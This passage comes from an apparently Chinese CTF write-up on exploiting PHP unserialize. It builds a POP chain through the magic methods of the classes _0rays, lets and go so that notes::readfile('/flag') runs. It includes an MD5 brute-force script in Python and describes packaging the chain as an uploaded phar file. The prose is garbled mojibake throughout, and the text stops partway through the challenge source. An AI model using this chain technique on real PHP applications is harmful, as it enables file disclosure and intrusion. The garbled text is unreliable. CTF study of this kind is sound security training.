invoke__">__set</span>():å­˜åœ¨äº**lets**ç±»ä¸­ï¼Œå½“è®¾ç½®ä¸€ä¸ªç±»åŠå…¶çˆ¶ç±»æ–¹æ³•ä¸­æœªå®šä¹‰çš„**å±æ€§**æ—¶<br><span class="hljs-title function_ invoke__">__invoke</span>():å­˜åœ¨äº**lets**ç±»ä¸­ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•<br></code></pre></td></tr></table></figure><p>å…¶æ¬¡è§‚å¯Ÿå¯åˆ©ç”¨äºå®ç°ç›®çš„æ“ä½œçš„è¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">å‘ç°ç›®æ ‡å­˜åœ¨äºnotesç±»ä¸­ï¼Œåªè¦è®©<span class="hljs-variable">$filepath</span>å‚æ•°ä¸º<span class="hljs-string">&#x27;/flag&#x27;</span>å³å¯é€šè¿‡<span class="hljs-title function_ invoke__">readfile</span>()è·å¾—flagï¼š<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br></code></pre></td></tr></table></figure><p>å†æ¬¡ï¼Œå¯»æ‰¾é¦–ä¸ªè§¦å‘çš„é­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">å‘ç°ç›®æ ‡å­˜åœ¨äº_0raysç±»ä¸­çš„<span class="hljs-title function_ invoke__">__wakeup</span>()ï¼Œå½“å‘ç”Ÿååºåˆ—åŒ–æ—¶ä¼šä¼˜å…ˆè°ƒç”¨è¯¥æ–¹æ³•<br>æ‰€ä»¥å¯ä»¥ä½œä¸ºååºåˆ—åŒ–æ”»å‡»çš„å…¥å£ï¼Œä»è¯¥æ–¹æ³•å¼€å§‹åˆ°<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$filepath</span>)æ–¹æ³•çš„<span class="hljs-title function_ invoke__">readfile</span>()æ„é€ é“¾å­<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-æ·±å…¥åˆ†æï¼Œæ„é€ é“¾å­"><a href="#2-æ·±å…¥åˆ†æï¼Œæ„é€ é“¾å­" class="headerlink" title="2.æ·±å…¥åˆ†æï¼Œæ„é€ é“¾å­"></a>2.æ·±å…¥åˆ†æï¼Œæ„é€ é“¾å­</h4><p>è¿™ä¸€æ­¥å°±éœ€è¦ç»“åˆæ¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•çš„è‡ªåŠ¨è°ƒç”¨æ¡ä»¶åˆ†æï¼Œç„¶åä»¥<u>å¥—å¨ƒ</u>çš„å½¢å¼ä¸æ–­<u>å°†çˆ¶ç±»ä¸­çš„ç‰¹å®šå±æ€§å£°æ˜ä¸ºè°ƒç”¨é­”æœ¯æ–¹æ³•æ‰€åœ¨çš„ç±»ï¼Œå®ç°é­”æœ¯æ–¹æ³•å±‚å±‚å‘ç›®æ ‡è°ƒç”¨çš„æ•ˆæœã€‚</u>æœ€ååºåˆ—åŒ–ç”Ÿæˆ phar æ–‡ä»¶ç”¨äºä¸Šä¼ ã€‚</p><p>1.__wakeup()ä½œä¸ºå…¥å£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>        <span class="hljs-comment">//call_user_func($this -&gt; jbn)å­˜åœ¨æ—¶throwæŠ›å‡ºï¼Œå¯ä»¤å±æ€§$jbn=&#x27;phpinfo&#x27;</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>            <span class="hljs-comment">//å±æ€§$pankasä½œä¸ºå­—ç¬¦ä¸²è¢«æŠ›å‡ºï¼Œå› æ­¤å¯ä»¥è”æƒ³åˆ°letsç±»ä¸­çš„é­”æœ¯æ–¹æ³•__toString()</span><br>            <span class="hljs-comment">//letsç±»è¢«å½“åšå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨é­”æœ¯æ–¹æ³•__toString()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.ä»¤ $pankas ä¸º lets ç±»æ¥è¡”æ¥ lets ç±»ä¸­çš„é­”æœ¯æ–¹æ³•__toString()ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-comment">//$mak4r1ç”¨md5åŠ å¯†åçš„å€’æ•°2~4ä½èµ‹å€¼ç»™ä¸€ä¸ªæœªå£°æ˜çš„å±æ€§ï¼Œè”æƒ³åˆ°letsç±»ä¸­çš„é­”æœ¯æ–¹æ³•__set()</span><br>        <span class="hljs-comment">//letsç±»æœªå£°æ˜çš„å±æ€§è¢«èµ‹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨é­”æœ¯æ–¹æ³•__set()</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>3.ä»¤ $rocket ä¸º lets ç±»æ¥è¡”æ¥ lets ç±»ä¸­çš„é­”æœ¯æ–¹æ³•__set()ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-comment">//$aä¸ºè¢«èµ‹å€¼å˜é‡ï¼Œ$bä¸ºèµ‹å€¼å˜é‡ï¼Œå³ä¸Šä¸€å±‚çº§çš„$k0rian</span><br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br>        <span class="hljs-comment">//æœªè¢«å£°æ˜çš„å±æ€§gtgèµ‹å€¼ç»™å˜é‡$int_barbituricï¼Œè”æƒ³åˆ°goç±»ä¸­çš„é­”æœ¯æ–¹æ³•__get()</span><br>        <span class="hljs-comment">//goç±»æœªå£°æ˜çš„å±æ€§ç”¨äºèµ‹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨é­”æœ¯æ–¹æ³•__get()</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>4.ä»¤ $ech0 ä¸º go ç±»æ¥è¡”æ¥ go ç±»ä¸­çš„é­”æœ¯æ–¹æ³•__get()ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-comment">//å½“ä¸Šä¸€å±‚çº§letsç±»å˜é‡$yolbbyç­‰äº&quot;666&quot;æ—¶</span><br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>            <span class="hljs-comment">//å˜é‡$dilveyè¢«ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œè”æƒ³åˆ°letsç±»ä¸­çš„é­”æœ¯æ–¹æ³•__invoke()</span><br>            <span class="hljs-comment">//letsç±»çš„å¯¹è±¡è¢«å½“åšå‡½æ•°è°ƒç”¨æ—¶è‡ªåŠ¨è°ƒç”¨é­”æœ¯æ–¹æ³•__invoke()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>5.ä»¤ $ed_xinhu ä¸º lets ç±»æ¥è¡”æ¥ lets ç±»ä¸­çš„é­”æœ¯æ–¹æ³•__invoke()ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>        <span class="hljs-comment">//åˆ›å»ºå‚æ•°ä¸º$errmisçš„notesç±»æ–°å¯¹è±¡ï¼Œè‡ªåŠ¨è°ƒç”¨notesç±»é­”æœ¯æ–¹æ³•__construct()</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>6.ä»¤ $errmis ä¸ºâ€™&#x2F;flagâ€™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-comment">//å‚æ•°ä¼ é€’ç»™$filepathå³æ‰§è¡Œreadfile(&#x27;/flag&#x27;)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>7.ç»¼ä¸Šæ„é€ é“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-comment">//$mak4r1--&gt;ç”¨md5åŠ å¯†--&gt;å–å€’æ•°2~4ä½--&gt;$yolbby</span><br><span class="hljs-comment">//å†™ä¸ªpythonè„šæœ¬æšä¸¾å‡ºä¸€ä¸ªmd5åŠ å¯†åå¯†æ–‡æ»¡è¶³&#x27;666&#x27;æ¡ä»¶çš„å­—ç¬¦ä¸²å³å¯</span><br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br></code></pre></td></tr></table></figure><p>æšä¸¾ç”¨çš„ python è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">input_string</span>):<br>    md5_hash = hashlib.md5()<br>    md5_hash.update(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5_hash.hexdigest()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    input_string = <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))<br>    <span class="hljs-keyword">if</span> md5_hash(input_string)[-<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>]== <span class="hljs-string">&quot;666&quot;</span>:<br>        <span class="hljs-built_in">print</span>(input_string)<br>        <span class="hljs-built_in">print</span>(md5_hash(input_string))<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>å„å¯¹è±¡å˜é‡çš„ç»“æ„å›¾</p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/1.png"></p><h4 id="3-ç”Ÿæˆ-phar-æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶è§¦å‘ååºåˆ—åŒ–"><a href="#3-ç”Ÿæˆ-phar-æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶è§¦å‘ååºåˆ—åŒ–" class="headerlink" title="3.ç”Ÿæˆ phar æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶è§¦å‘ååºåˆ—åŒ–"></a>3.ç”Ÿæˆ phar æ–‡ä»¶ï¼Œä¸Šä¼ å¹¶è§¦å‘ååºåˆ—åŒ–</h4><p>ç»“åˆä¸Šé¢å†™å¥½çš„åœ¨æœ¬åœ°è·‘å‡º phar æ–‡ä»¶å¹¶æµ‹è¯•æ­£ç¡®æ€§ï¼Œå¯ä»¥ç”¨å°çš®çœ‹ä¸€ä¸‹æ•ˆæœï¼Œä¹Ÿå¯ä»¥ vscode ä¸Šé…ä¸€ä¸‹ç¯å¢ƒè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼ŒåŠ æ·±ååºåˆ—åŒ–æ”»å‡»è¿‡ç¨‹çš„ç†è§£ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span 